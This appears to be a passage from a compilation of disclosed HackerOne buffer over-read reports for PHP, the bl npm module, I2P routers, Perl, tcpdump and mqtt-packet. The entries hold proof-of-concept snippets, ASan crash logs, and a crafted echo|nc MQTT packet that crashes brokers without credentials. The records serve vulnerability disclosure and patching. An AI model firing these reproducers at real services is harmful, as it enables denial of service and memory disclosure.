=>0x0c047fff9560: fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00[02]
  0x0c047fff9570: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 02 fa
  0x0c047fff9580: fa fa fd fa fa fa 00 00 fa fa 00 fa fa fa 00 05
  0x0c047fff9590: fa fa fd fa fa fa 00 05 fa fa fd fa fa fa 00 04
  0x0c047fff95a0: fa fa fd fa fa fa 00 fa fa fa fd fd fa fa fd fd
  0x0c047fff95b0: fa fa fd fd fa fa fd fd fa fa fd fa fa fa 00 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2741==ABORTING
```

## Impact

A context dependent attacker can trigger unsafe memory access. This may reveal information, affect availability, or be used as part of an exploit chain.

This was tracked as [PHP bug 77143](https://bugs.php.net/bug.php?id=77143)
PHP released fixes for supported affected versions on December 6 2018 as noted in their [changelog](http://php.net/ChangeLog-7.php#7.2.13).

---

### [[bl] Uninitialized memory exposure via negative .consume()](https://hackerone.com/reports/966347)

- **Report ID:** `966347`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2020-08-27T15:16:42.547Z
- **CVE(s):** CVE-2020-8244

**Vulnerability Information:**

# Module

**module name:** bl
**version:** 4.0.2
**npm page:** `https://www.npmjs.com/package/bl`

## Module Description

> A Node.js Buffer list collector, reader and streamer thingy.

## Module Stats

8 660 595 weekly downloads

# Vulnerability

## Vulnerability Description

If user input (even typed) ends up in `consume()` argument and can become negative,
BufferList state can be corrupted, tricking it into exposing uninitialized memory via
regular `.slice()` calls.

## Steps To Reproduce:

```
const { BufferList } = require('bl')
const secret = require('crypto').randomBytes(256)
for (let i = 0; i < 1e6; i++) {
  const clone = Buffer.from(secret)
  const bl = new BufferList()
  bl.append(Buffer.from('a'))
  bl.consume(-1024)
  const buf = bl.slice(1)
  if (buf.indexOf(clone) !== -1) {
    console.error(`Match (at ${i})`, buf)
  }
}
```

## Patch

### First component (more important):

In `BufferList.prototype.copy`, before the last `return dst`:
```js
  if (dst.length !== bufoff) return dst.slice(0, bufoff)
```

### Second component:

Check `.consume()` argument to be a non-negative integer.

## Supporting Material/References:

- Node.js v14.8.0

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

## Impact

In case if the argument of `consume()` is attacker controlled:
1. Expose uninitialized memory, containing source code, passwords, network traffic, etc.
2. Cause invalid data in slices (low control)
3. Cause DoS by allocating a large buffer this way (with a large negative number before a slice/toString call is performed).

---

### [GarlicRust - heartbleed style vulnerability in major I2P C++ router implementations](https://hackerone.com/reports/295740)

- **Report ID:** `295740`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @aerodudrizzt
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:45:56.450Z
- **CVE(s):** CVE-2017-17066

**Vulnerability Information:**

Brief
-----
I2pd and kovri are both C++ I2P routers that share the same code base, as kovri was forked from i2pd several years ago. The vulnerability lies in a common code piece, making both implementations vulnerable, as was acknowledged by orignal, the main developer of i2pd.
The vulnerability is that there is lack of sanitation checks when handling Garlic messages in the both routers: by sending a specially crafted Garlic message, an attacker can cause the router to send onward an I2P message containing leaked RAM data, triggering a massive (up to ~16KB) information leakage.

Technical Details:
===========
Code Version: Taken from Kovri Github on the 18th of November 2017
Commit 5aafe6608519d31e537c97b24ea7b23aa372dd5b
Vulnerable File: src\core\router\garlic.h
Vulnerable Function: GarlicDestination::HandleGarlicPayload
The function is responsible to parse and handle Garlic Payloads: several independent Garlic Cloves.
When handling a clove with a delivery type of "DeliveryTypeTunnel" there are insufficient checks on the message, before it is wrapped and sent onward:
```cpp
    GarlicDeliveryType delivery_type = (GarlicDeliveryType)((flag >> 5) & 0x03);
    switch (delivery_type) {
      case eGarlicDeliveryTypeLocal:
        LOG(debug) << "GarlicDestination: Garlic type local";
        HandleI2NPMessage(buf, len, from);
      break;
      case eGarlicDeliveryTypeDestination:
        LOG(debug) << "GarlicDestination: Garlic type destination";
        buf += 32;  // destination. check it later or for multiple destinations
        HandleI2NPMessage(buf, len, from);
      break;
      case eGarlicDeliveryTypeTunnel: {
        LOG(debug) << "GarlicDestination: Garlic type tunnel";
        // gateway_hash and gateway_tunnel sequence is reverted
        std::uint8_t* gateway_hash = buf;
        buf += 32;
        std::uint32_t gateway_tunnel = bufbe32toh(buf);
        buf += 4;
        std::shared_ptr<kovri::core::OutboundTunnel> tunnel;
        if (from && from->GetTunnelPool())
          tunnel = from->GetTunnelPool()->GetNextOutboundTunnel();
        // EI [BUG-TRACE] : The payload length is based on an unchecked length field
        // EI             : from the just found I2NP message contained in the clove.
        // EI             : When creating and sending this message onward we may leak
        // EI             : heap memory data to the destination node [18/11/2017]
        if (tunnel) {  // we have send it through an outbound tunnel
          auto msg = CreateI2NPMessage(buf, kovri::core::GetI2NPMessageLength(buf), from);
          tunnel->SendTunnelDataMsg(gateway_hash, gateway_tunnel, msg);
        } else {
          LOG(debug)
            << "GarlicDestination: no outbound tunnels available for garlic clove";
        }
        break;
      }
      case eGarlicDeliveryTypeRouter:
        LOG(warning) << "GarlicDestination: Garlic type router not supported";
        buf += 32;
      break;
      default:
        LOG(error)
          << "GarlicDestination: unknown garlic delivery type "
          << static_cast<int>(delivery_type);
    }
    buf += kovri::core::GetI2NPMessageLength(buf);  // I2NP
    buf += 4;  // CloveID
    buf += 8;  // Date
    buf += 3;  // Certificate
    // EI [BUG_TRACE] : This check is too late since the I2NP message was already sent. [18/11/2017]
    if (buf - buf1  > static_cast<int>(len)) {
      LOG(error) << "GarlicDestination: clove is too long";
      break;
    }
```

This vulnerability was first sent to the kovri bug bounty program (under the Monero project), later to be found as out-of-scope since kovri was found pre-mature and they removed it from the bug bounty scope. As part of the submission to the kovri project I demonstrated an exploit, and sent the project the entire test lab so they could re-create the exploit. Later on, orignal (i2pd) acknowledged the vulnerability in i2pd and issued a quick fix that can be found in i2pd version 2.17.0.

I am attaching the logs from the exploit demonstration to this ticket,. The logs shows the debug trace of the victim router and the leaked message as it was received by the attacker router. More info can be found in my blog post regarding the vulnerability - [link](https://eyalitkin.wordpress.com/2017/12/04/cve-publication-garlicrust-cve-2017-17066/).

After both projects patched the vulnerability, a public CVE was issued: CVE 2017-17066 a.k.a GarlicRust.

## Impact

The PoC exploit demonstration (elaborated [here](https://eyalitkin.wordpress.com/2017/12/04/cve-publication-garlicrust-cve-2017-17066/)) shows that the GarlicRust vulnerability can be exploited to leak sensitive memory data from any victim C++ i2p router. The exploit is **logical** and triggers no memory errors, and so it can be used **repeatedly** and without worries. An attacker can use this vulnerability in an attempt to read **session keys, private keys, old messages** or any other valuable assets that is stored on the target’s heap.

This vulnerability poses a **major threat to the anonymity** of the users in the Invisible Internet Protocol network (I2P). This threat also impact several crypto-currencies as the I2P network is used as an additional anonymity layer in major crypto-currencies such as: Anoncoin (ANC), and Monero (XMR).

---

### [Heap-buffer-overflow in Perl__byte_dump_string (utf8.c) could lead to memory leak](https://hackerone.com/reports/480778)

- **Report ID:** `480778`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @tmnt53
- **Bounty:** - usd
- **Disclosed:** 2019-10-24T20:57:47.575Z
- **CVE(s):** CVE-2018-6798, CVE-2018-6797

**Vulnerability Information:**

With crafted regex match, I have found a heap-over-flow in function Perl__byte_dump_string, which would lead to memory leak.
* Reported to the [Perl security mailing list](https://rt.perl.org/Public/Bug/Display.html?id=132063) on 11 Sep 2017.
* Confirmed as a security flaw by TonyC on 24 Feb 2018
* CVE-2018-6797 assigned to this flaw on 7 Feb 2018
* [Public security advisory](https://github.com/Perl/perl5/blob/blead/pod/perl5262delta.pod) released on 14 April 2018
```
=================================================================
==2895==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb610081c at pc 0x08a72387 bp 0xbfea6038 sp 0xbfea602c
WRITE of size 4 at 0xb610081c thread T0
    #0 0x8a72386 in S_pack_rec /root/karas/perl5-blead/pp_pack.c:2703:17
    #1 0x8a42706 in Perl_packlist /root/karas/perl5-blead/pp_pack.c:1980:11
    #2 0x8a73626 in Perl_pp_pack /root/karas/perl5-blead/pp_pack.c:3135:5
    #3 0x84dc7ac in Perl_runops_debug /root/karas/perl5-blead/dump.c:2465:23
    #4 0x818858a in S_fold_constants /root/karas/perl5-blead/op.c:4557:2
    #5 0x8186c5a in Perl_op_convert_list /root/karas/perl5-blead/op.c:4896:12
    #6 0x8363e7e in Perl_yyparse /root/karas/perl5-blead/perly.y:889:23
    #7 0x8232350 in S_parse_body /root/karas/perl5-blead/perl.c:2401:9
    #8 0x82285e3 in perl_parse /root/karas/perl5-blead/perl.c:1719:2
    #9 0x81494a6 in main /root/karas/perl5-blead/perlmain.c:121:18
    #10 0xb74d5636 in __libc_start_main /build/glibc-KM3i_a/glibc-2.23/csu/../csu/libc-start.c:291
    #11 0x8075847 in _start (/root/karas/perl5-blead/perl+0x8075847)

0xb610081c is located 2 bytes to the right of 10-byte region [0xb6100810,0xb610081a)
allocated by thread T0 here:
    #0 0x8119b84 in malloc (/root/karas/perl5-blead/perl+0x8119b84)
    #1 0x84e2987 in Perl_safesysmalloc /root/karas/perl5-blead/util.c:153:21

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/karas/perl5-blead/pp_pack.c:2703:17 in S_pack_rec
Shadow bytes around the buggy address:
  0x36c200b0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa 00 04
  0x36c200c0: fa fa fd fd fa fa 00 04 fa fa 00 04 fa fa 00 04
  0x36c200d0: fa fa 00 04 fa fa 00 04 fa fa 00 04 fa fa 00 04
  0x36c200e0: fa fa 00 04 fa fa 00 04 fa fa 00 04 fa fa 00 04
  0x36c200f0: fa fa fd fa fa fa fd fd fa fa 00 02 fa fa 01 fa
=>0x36c20100: fa fa 00[02]fa fa 00 02 fa fa fd fd fa fa 00 04
  0x36c20110: fa fa 02 fa fa fa 00 02 fa fa 07 fa fa fa 00 02
  0x36c20120: fa fa 00 02 fa fa 00 00 fa fa 00 05 fa fa 00 01
  0x36c20130: fa fa 00 07 fa fa 00 fa fa fa 00 02 fa fa 05 fa
  0x36c20140: fa fa 00 02 fa fa 06 fa fa fa 00 02 fa fa 05 fa
  0x36c20150: fa fa 00 05 fa fa 04 fa fa fa 05 fa fa fa 05 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2895==ABORTING
```

## Impact

Depending on the heap implementation a remote attacker could leak heap information to bypass ASLR.

---

### [CVE-2017-13008 The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().](https://hackerone.com/reports/268805)

- **Report ID:** `268805`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T20:32:35.216Z
- **CVE(s):** CVE-2017-13008

**Vulnerability Information:**

Reported to the devs on 6 March 2017.
Tcpdump 4.9.2 released on 8 September 2017.
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/5edf405d7ed9fc92f4f43e8a3d44baa4c6387562

`The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().`

```
./tcpdump -n -r test000

==4043==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60700000dff7 at pc 0x00000048f0e0 bp 0x7ffe26d60590 sp 0x7ffe26d5fd50
READ of size 1 at 0x60700000dff7 thread T0
    #0 0x48f0df in __asan_memcpy (/root/tcpdump/tcpdump+0x48f0df)
    #1 0x4eb08b in parse_elements /root/tcpdump/./print-802_11.c:1192:4
    #2 0x4e2fce in handle_beacon /root/tcpdump/./print-802_11.c:1252:8
    #3 0x4e2fce in mgmt_body_print /root/tcpdump/./print-802_11.c:1654
    #4 0x4e2fce in ieee802_11_print /root/tcpdump/./print-802_11.c:2098
    #5 0x4e9142 in ieee802_11_radio_print /root/tcpdump/./print-802_11.c:3269:15
    #6 0x4e9142 in ieee802_11_radio_if_print /root/tcpdump/./print-802_11.c:3364
    #7 0x4de2e9 in pretty_print_packet /root/tcpdump/./print.c:339:18
    #8 0x4cc5fb in print_packet /root/tcpdump/./tcpdump.c:2556:2
    #9 0x773e10 in pcap_offline_read /root/libpcap/./savefile.c:527:4
    #10 0x6a258c in pcap_loop /root/libpcap/./pcap.c:1657:8
    #11 0x4c8a6e in main /root/tcpdump/./tcpdump.c:2059:12
    #12 0x7f1166aa9b44 in __libc_start_main /build/glibc-qK83Be/glibc-2.19/csu/libc-start.c:287
    #13 0x4c3ccc in _start (/root/tcpdump/tcpdump+0x4c3ccc)

0x60700000dff7 is located 0 bytes to the right of 71-byte region [0x60700000dfb0,0x60700000dff7)
allocated by thread T0 here:
    #0 0x4a664b in __interceptor_malloc (/root/tcpdump/tcpdump+0x4a664b)
    #1 0x775763 in pcap_check_header /root/libpcap/./sf-pcap.c:401:14
    #2 0x773472 in pcap_fopen_offline_with_tstamp_precision /root/libpcap/./savefile.c:400:7
    #3 0x773204 in pcap_open_offline_with_tstamp_precision /root/libpcap/./savefile.c:307:6

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 __asan_memcpy
```

---

### [CVE-2017-12986 The IPv6 routing header parser in tcpdump before 4.9.2 has a buffer over-read in print-rt6.c:rt6_print().](https://hackerone.com/reports/268804)

- **Report ID:** `268804`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T20:32:28.931Z
- **CVE(s):** CVE-2017-12986

**Vulnerability Information:**

Reported to the devs on 4 February 2017.
Tcpdump 4.9.2 released on 8 September 2017.
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/7ac73d6cd41e9d4ac0ca7e6830ca390e195bb21c

`The IPv6 routing header parser in tcpdump before 4.9.2 has a buffer over-read in print-rt6.c:rt6_print().`

```
/tcpdump -nr test000
reading from file test000, link-type IPV6 (Raw IPv6)
=================================================================
==567==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60400000e001 at pc 0x00000063663d bp 0x7ffec82f8fb0 sp 0x7ffec82f8fa8
READ of size 1 at 0x60400000e001 thread T0
    #0 0x63663c in rt6_print /root/tcpdump/./print-rt6.c:48:2
    #1 0x57859b in ip6_print /root/tcpdump/./print-ip6.c:328:14
    #2 0x576fdc in ipN_print /root/tcpdump/./print-ip.c:700:3
    #3 0x626677 in raw_if_print /root/tcpdump/./print-raw.c:42:2
    #4 0x4de3c9 in pretty_print_packet /root/tcpdump/./print.c:339:18
    #5 0x4ccb0b in print_packet /root/tcpdump/./tcpdump.c:2555:2
    #6 0x775960 in pcap_offline_read /root/libpcap/./savefile.c:527:4
    #7 0x6a3f3c in pcap_loop /root/libpcap/./pcap.c:1623:8
    #8 0x4c8f1e in main /root/tcpdump/./tcpdump.c:2058:12
    #9 0x7fe428299b44 in __libc_start_main /build/glibc-qK83Be/glibc-2.19/csu/libc-start.c:287
    #10 0x4c419c in _start (/root/tcpdump/tcpdump+0x4c419c)

0x60400000e001 is located 1 bytes to the right of 48-byte region [0x60400000dfd0,0x60400000e000)
allocated by thread T0 here:
    #0 0x4a6b1b in malloc (/root/tcpdump/tcpdump+0x4a6b1b)
    #1 0x7772b3 in pcap_check_header /root/libpcap/./sf-pcap.c:401:14
    #2 0x774fc2 in pcap_fopen_offline_with_tstamp_precision /root/libpcap/./savefile.c:400:7
    #3 0x774d54 in pcap_open_offline_with_tstamp_precision /root/libpcap/./savefile.c:307:6

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/tcpdump/./print-rt6.c:48 rt6_print
```

---

### [CVE-2017-13038 The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:handle_mlppp().](https://hackerone.com/reports/268808)

- **Report ID:** `268808`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T20:32:23.099Z
- **CVE(s):** CVE-2017-13038

**Vulnerability Information:**

Reported to the devs on 11 June 2017.
Tcpdump 4.9.2 released on 8 September 2017.
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/7335163a6ef82d46ff18f3e6099a157747241629

`The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:handle_mlppp().`

```
./tcpdump -nr test003
reading from file test003, link-type PPP_ETHER (PPPoE)
=================================================================
==20519==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5d006f8 at pc 0x082c8c68 bp 0xbf80a208 sp 0xbf80a1fc
READ of size 2 at 0xb5d006f8 thread T0
    #0 0x82c8c67 in EXTRACT_16BITS /root/tcpdump-4.9.0/./extract.h:151:20
    #1 0x82c8c67 in handle_mlppp /root/tcpdump-4.9.0/./print-ppp.c:814
    #2 0x82c8c67 in handle_ppp /root/tcpdump-4.9.0/./print-ppp.c:1462
    #3 0x82c1f87 in ppp_print /root/tcpdump-4.9.0/./print-ppp.c:1566:2
    #4 0x82cb232 in pppoe_print /root/tcpdump-4.9.0/./print-pppoe.c:195:26
    #5 0x82ca729 in pppoe_if_print /root/tcpdump-4.9.0/./print-pppoe.c:90:10
    #6 0x8172ac8 in pretty_print_packet /root/tcpdump-4.9.0/./print.c:339:18
    #7 0x8160678 in print_packet /root/tcpdump-4.9.0/./tcpdump.c:2501:2
    #8 0x843e96b in pcap_offline_read /root/libpcap-1.8.1/./savefile.c:527:4
    #9 0x835973c in pcap_loop /root/libpcap-1.8.1/./pcap.c:890:8
    #10 0x815bd9c in main /root/tcpdump-4.9.0/./tcpdump.c:2004:12
    #11 0xb752f275 in __libc_start_main /build/glibc-4LXvX6/glibc-2.24/csu/../csu/libc-start.c:291
    #12 0x8064dc7 in _start (/root/tcpdump-4.9.0/tcpdump+0x8064dc7)

0xb5d006f9 is located 0 bytes to the right of 9-byte region [0xb5d006f0,0xb5d006f9)
allocated by thread T0 here:
    #0 0x811e994 in malloc (/root/tcpdump-4.9.0/tcpdump+0x811e994)
    #1 0x843fcdc in pcap_check_header /root/libpcap-1.8.1/./sf-pcap.c:401:14
    #2 0x843dc55 in pcap_fopen_offline_with_tstamp_precision /root/libpcap-1.8.1/./savefile.c:400:7
    #3 0x843da38 in pcap_open_offline_with_tstamp_precision /root/libpcap-1.8.1/./savefile.c:307:6

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/tcpdump-4.9.0/./extract.h:151:20 in EXTRACT_16BITS
```

---

### [CVE-2017-13010 The BEEP parser in tcpdump before 4.9.2 has a buffer over-read in print-beep.c:l_strnstart().](https://hackerone.com/reports/268807)

- **Report ID:** `268807`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T20:32:16.120Z
- **CVE(s):** CVE-2017-13010

**Vulnerability Information:**

Reported to the devs on 6 March 2017.
Tcpdump 4.9.2 released on 8 September 2017.
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/877b66b398518d9501513e0860c9f3a8acc70892

`The BEEP parser in tcpdump before 4.9.2 has a buffer over-read in print-beep.c:l_strnstart().`

```
./tcpdump -n -r test005

==28756==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60600000f004 at pc 0x000000448f71 bp 0x7ffe8e433bd0 sp 0x7ffe8e433388
READ of size 1 at 0x60600000f004 thread T0
    #0 0x448f70 in strncmp (/root/tcpdump/tcpdump+0x448f70)
    #1 0x508343 in l_strnstart /root/tcpdump/./print-beep.c:37:10
    #2 0x508343 in beep_print /root/tcpdump/./print-beep.c:44
    #3 0x671447 in tcp_print /root/tcpdump/./print-tcp.c:703:17
    #4 0x57617c in ip6_print /root/tcpdump/./print-ip6.c:345:4
    #5 0x57453c in ipN_print /root/tcpdump/./print-ip.c:700:3
    #6 0x626c07 in raw_if_print /root/tcpdump/./print-raw.c:42:2
    #7 0x4de2e9 in pretty_print_packet /root/tcpdump/./print.c:339:18
    #8 0x4cc5fb in print_packet /root/tcpdump/./tcpdump.c:2556:2
    #9 0x773e00 in pcap_offline_read /root/libpcap/./savefile.c:527:4
    #10 0x6a257c in pcap_loop /root/libpcap/./pcap.c:1657:8
    #11 0x4c8a6e in main /root/tcpdump/./tcpdump.c:2059:12
    #12 0x7f651cfa4b44 in __libc_start_main /build/glibc-qK83Be/glibc-2.19/csu/libc-start.c:287
    #13 0x4c3ccc in _start (/root/tcpdump/tcpdump+0x4c3ccc)

0x60600000f004 is located 4 bytes to the right of 64-byte region [0x60600000efc0,0x60600000f000)
allocated by thread T0 here:
    #0 0x4a664b in __interceptor_malloc (/root/tcpdump/tcpdump+0x4a664b)
    #1 0x775753 in pcap_check_header /root/libpcap/./sf-pcap.c:401:14
    #2 0x773462 in pcap_fopen_offline_with_tstamp_precision /root/libpcap/./savefile.c:400:7
    #3 0x7731f4 in pcap_open_offline_with_tstamp_precision /root/libpcap/./savefile.c:307:6

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 strncmp
```

---

### [CVE-2017-13009 The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_print().](https://hackerone.com/reports/268806)

- **Report ID:** `268806`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T20:32:09.957Z
- **CVE(s):** CVE-2017-13009

**Vulnerability Information:**

Reported to the devs on 6 March 2017.
Tcpdump 4.9.2 released on 8 September 2017.
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/db8c799f6dfc68765c9451fcbfca06e662f5bd5f

`The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_print().`

```
./tcpdump -n -r test005

==2606==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60400000dfff at pc 0x0000005ca779 bp 0x7ffe216cc6f0 sp 0x7ffe216cc6e8
READ of size 1 at 0x60400000dfff thread T0
    #0 0x5ca778 in mobility_print /root/tcpdump/./print-mobility.c:301:7
    #1 0x575edc in ip6_print /root/tcpdump/./print-ip6.c:326:14
    #2 0x57458c in ipN_print /root/tcpdump/./print-ip.c:700:3
    #3 0x626c17 in raw_if_print /root/tcpdump/./print-raw.c:42:2
    #4 0x4de2e9 in pretty_print_packet /root/tcpdump/./print.c:339:18
    #5 0x4cc5fb in print_packet /root/tcpdump/./tcpdump.c:2556:2
    #6 0x773e10 in pcap_offline_read /root/libpcap/./savefile.c:527:4
    #7 0x6a258c in pcap_loop /root/libpcap/./pcap.c:1657:8
    #8 0x4c8a6e in main /root/tcpdump/./tcpdump.c:2059:12
    #9 0x7f0f6ba90b44 in __libc_start_main /build/glibc-qK83Be/glibc-2.19/csu/libc-start.c:287
    #10 0x4c3ccc in _start (/root/tcpdump/tcpdump+0x4c3ccc)

0x60400000dfff is located 0 bytes to the right of 47-byte region [0x60400000dfd0,0x60400000dfff)
allocated by thread T0 here:
    #0 0x4a664b in __interceptor_malloc (/root/tcpdump/tcpdump+0x4a664b)
    #1 0x775763 in pcap_check_header /root/libpcap/./sf-pcap.c:401:14
    #2 0x773472 in pcap_fopen_offline_with_tstamp_precision /root/libpcap/./savefile.c:400:7
    #3 0x773204 in pcap_open_offline_with_tstamp_precision /root/libpcap/./savefile.c:307:6

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/tcpdump/./print-mobility.c:301 mobility_print
```

---

### [CVE-2017-12985: The IPv6 parser in tcpdump before 4.9.2 has a buffer over-read in ip6_print()](https://hackerone.com/reports/268803)

- **Report ID:** `268803`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T20:32:03.897Z
- **CVE(s):** CVE-2017-12985

**Vulnerability Information:**

Reported to the devs on 4 February 2017.
Tcpdump 4.9.2 released on 8 September 2017.
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/66df248b49095c261138b5a5e34d341a6bf9ac7f

`The IPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-ip6.c.`

```
./tcpdump -nr test003
reading from file test003, link-type IPV6 (Raw IPv6)
=================================================================
==31276==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60400000e000 at pc 0x000000578cd5 bp 0x7ffe8e397cd0 sp 0x7ffe8e397cc8
READ of size 1 at 0x60400000e000 thread T0
    #0 0x578cd4 in ip6_print /root/tcpdump/./print-ip6.c:348:4
    #1 0x576fdc in ipN_print /root/tcpdump/./print-ip.c:700:3
    #2 0x626677 in raw_if_print /root/tcpdump/./print-raw.c:42:2
    #3 0x4de3c9 in pretty_print_packet /root/tcpdump/./print.c:339:18
    #4 0x4ccb0b in print_packet /root/tcpdump/./tcpdump.c:2555:2
    #5 0x775960 in pcap_offline_read /root/libpcap/./savefile.c:527:4
    #6 0x6a3f3c in pcap_loop /root/libpcap/./pcap.c:1623:8
    #7 0x4c8f1e in main /root/tcpdump/./tcpdump.c:2058:12
    #8 0x7efcfe253b44 in __libc_start_main /build/glibc-qK83Be/glibc-2.19/csu/libc-start.c:287
    #9 0x4c419c in _start (/root/tcpdump/tcpdump+0x4c419c)

0x60400000e000 is located 0 bytes to the right of 48-byte region [0x60400000dfd0,0x60400000e000)
allocated by thread T0 here:
    #0 0x4a6b1b in malloc (/root/tcpdump/tcpdump+0x4a6b1b)
    #1 0x7772b3 in pcap_check_header /root/libpcap/./sf-pcap.c:401:14
    #2 0x774fc2 in pcap_fopen_offline_with_tstamp_precision /root/libpcap/./savefile.c:400:7
    #3 0x774d54 in pcap_open_offline_with_tstamp_precision /root/libpcap/./savefile.c:307:6

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/tcpdump/./print-ip6.c:348 ip6_print
```

---

### [A specifically malformed MQTT Subscribe packet crashes MQTT Brokers using the mqtt-packet module for decoding  ](https://hackerone.com/reports/541354)

- **Report ID:** `541354`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Node.js third-party modules
- **Reporter:** @lxndr
- **Bounty:** - usd
- **Disclosed:** 2019-04-28T07:36:31.109Z
- **CVE(s):** CVE-2019-5432

**Vulnerability Information:**

I would like to report a buffer over-read in mqtt-packet respectively BufferList module.
It allows triggering an out of range read on a buffer which throws a RangeError. MQTT Brokers like mosca and aedes using this module can be forced to crash by sending a specifically malformed MQTT Subscribe packet. 

# Module

**module name:** mqtt-packet
**version:** 6.1.1
**npm page:** `https://www.npmjs.com/package/mqtt-packet`

## Module Description

Encode and Decode MQTT 3.1.1, 5.0 packets the node way.

## Module Stats

114,635 weekly downloads

# Vulnerability

## Vulnerability Description

From the original E-Mail to the Author:
*Hey Matteo,
while playing around with mosca/aedes and our fuzzing approach from IoT-Testware, I discovered some flaws which cause mosca/aedes to crash. Though, I assume the reasons originate from the mqtt-packet respectively bl modules. 
I didn't open an issue because the issue is IMHO quite critical. One could try to abuse to crash mosca/aedes without requiring any credentials, thus might lead to easy DoS attacks.
The malformed Subscribe Packet crashes mosca (v2.8.3) and aedes (v0.37.0), no valid credentials required.*

## Steps To Reproduce:

> Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.

1. start either mosca or aedes MQTT Broker
2. shoot the following command against the Broker (on localhost)
  * `echo -ne '\x104\x00\x04MQTT\x04\xc2\x00\xff\x00\x19alicedoesnotneedaclientid\x00\x05alice\x00\x06secret\x82\x19\xa5\xa6\x00\x15hello/topic/of/alice\x00' | nc localhost 1883`
  * the sent byte string contains 2 accumulated MQTT Packets. The second packet is a subscribe packet and is processed in any case and the Broker's Auth mechanisms are undermined.

## Patch

Please find a GitHub patch attached.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 18.04.2 LTS
- nodejs -v `v6.17.1`
- npm -v `3.10.10`

# Wrap up

- I contacted the maintainer to let them know: [Y] 
- I opened an issue in the related repository: [N]

## Impact

An attacker can harm the availability of MQTT services which are using these modules.

---
